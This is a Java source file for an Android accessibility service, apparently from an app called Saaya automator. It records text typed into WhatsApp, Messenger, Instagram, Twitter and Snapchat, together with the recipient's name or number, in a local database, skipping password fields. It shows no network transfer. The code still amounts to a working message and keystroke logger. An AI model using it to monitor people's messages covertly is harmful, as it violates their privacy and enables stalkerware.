package com.saaya.automator.core;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.saaya.automator.data.SaayaMemoryDB;

import java.util.List;
import java.util.regex.Pattern;

/**
 * SaayaService - Core Accessibility Service with Threading
 * CRITICAL FIX: All database operations run on background threads
 */
public class SaayaService extends AccessibilityService {

    private static final String TAG = "SaayaService";
    private static SaayaService instance;
    private SaayaMemoryDB memoryDB;
    private boolean isActive = false;

    // Packages to monitor
    private static final String[] MONITORED_PACKAGES = {
        "com.whatsapp",
        "com.facebook.orca",
        "com.instagram.android",
        "com.twitter.android",
        "com.snapchat.android"
    };

    // Regex patterns
    private static final Pattern PHONE_PATTERN = Pattern.compile("^\\+?[0-9\\s\\-()]+$");

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        memoryDB = SaayaMemoryDB.getInstance(this);
        Log.d(TAG, "Saaya Service Created");
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        isActive = true;
        Log.i(TAG, "✓ Saaya Shadow is now ACTIVE");
        
        // Broadcast status
        Intent intent = new Intent("com.saaya.automator.SERVICE_STATUS");
        intent.putExtra("status", "active");
        sendBroadcast(intent);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (!isActive || event == null) {
            return;
        }

        String packageName = event.getPackageName() != null ? 
                           event.getPackageName().toString() : "";

        // Only monitor specific packages
        if (!isMonitoredPackage(packageName)) {
            return;
        }

        int eventType = event.getEventType();

        switch (eventType) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                handleTextChanged(event, packageName);
                break;

            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                handleWindowStateChanged(event, packageName);
                break;
        }
    }

    /**
     * CRITICAL: Handle text changes with THREADING
     */
    private void handleTextChanged(AccessibilityEvent event, String packageName) {
        AccessibilityNodeInfo source = event.getSource();
        
        if (source == null) {
            return;
        }

        // SECURITY: Ignore password fields
        if (source.isPassword()) {
            Log.d(TAG, "⚠ Password field detected - IGNORED");
            source.recycle();
            return;
        }

        // Extract message text
        CharSequence text = source.getText();
        if (text != null && text.length() > 0) {
            String messageText = text.toString();
            
            // Detect recipient
            String recipientName = detectRecipient(getRootInActiveWindow(), packageName);
            
            // CRITICAL FIX: Save to database on background thread
            final String finalRecipient = recipientName;
            final String finalMessage = messageText;
            final String finalPackage = packageName;
            
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        memoryDB.saveLog(
                            System.currentTimeMillis(),
                            finalPackage,
                            finalRecipient,
                            finalMessage
                        );
                        Log.d(TAG, "📝 Saved: " + finalPackage + " -> " + finalRecipient);
                    } catch (Exception e) {
                        Log.e(TAG, "Database error: " + e.getMessage());
                    }
                }
            }).start();
        }

        source.recycle();
    }

    /**
     * Detect recipient name or phone number from screen
     */
    private String detectRecipient(AccessibilityNodeInfo rootNode, String packageName) {
        if (rootNode == null) {
            return "Unknown";
        }

        String recipient = "Unknown";

        try {
            // Try to find title/header text (usually contains contact name)
            List<AccessibilityNodeInfo> titleNodes = rootNode.findAccessibilityNodeInfosByViewId(
                packageName + ":id/title"
            );
            
            if (titleNodes != null && !titleNodes.isEmpty()) {
                CharSequence title = titleNodes.get(0).getText();
                if (title != null) {
                    recipient = title.toString();
                }
            }

            // If title not found, try conversation_contact_name (WhatsApp)
            if ("Unknown".equals(recipient) && packageName.contains("whatsapp")) {
                List<AccessibilityNodeInfo> contactNodes = rootNode.findAccessibilityNodeInfosByViewId(
                    "com.whatsapp:id/conversation_contact_name"
                );
                
                if (contactNodes != null && !contactNodes.isEmpty()) {
                    CharSequence contact = contactNodes.get(0).getText();
                    if (contact != null) {
                        recipient = contact.toString();
                    }
                }
            }

            // Check if it's a phone number
            if (PHONE_PATTERN.matcher(recipient).matches()) {
                // It's a phone number - keep as is
                Log.d(TAG, "Detected phone number: " + recipient);
            }

        } catch (Exception e) {
            Log.e(TAG, "Error detecting recipient: " + e.getMessage());
        }

        return recipient;
    }

    /**
     * Handle window state changes
     */
    private void handleWindowStateChanged(AccessibilityEvent event, String packageName) {
        CharSequence className = event.getClassName();
        if (className != null) {
            String activity = className.toString();
            Log.d(TAG, "📱 App opened: " + packageName + " - " + activity);
        }
    }

    /**
     * Check if package should be monitored
     */
    private boolean isMonitoredPackage(String packageName) {
        for (String pkg : MONITORED_PACKAGES) {
            if (packageName.contains(pkg)) {
                return true;
            }
        }
        return false;
    }

    /**
     * Get singleton instance
     */
    public static SaayaService getInstance() {
        return instance;
    }

    /**
     * Check if service is active
     */
    public boolean isServiceActive() {
        return isActive;
    }

    @Override
    public void onInterrupt() {
        Log.w(TAG, "Saaya Service Interrupted");
        isActive = false;
        
        Intent intent = new Intent("com.saaya.automator.SERVICE_STATUS");
        intent.putExtra("status", "inactive");
        sendBroadcast(intent);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isActive = false;
        instance = null;
        Log.d(TAG, "Saaya Service Destroyed");
    }
}
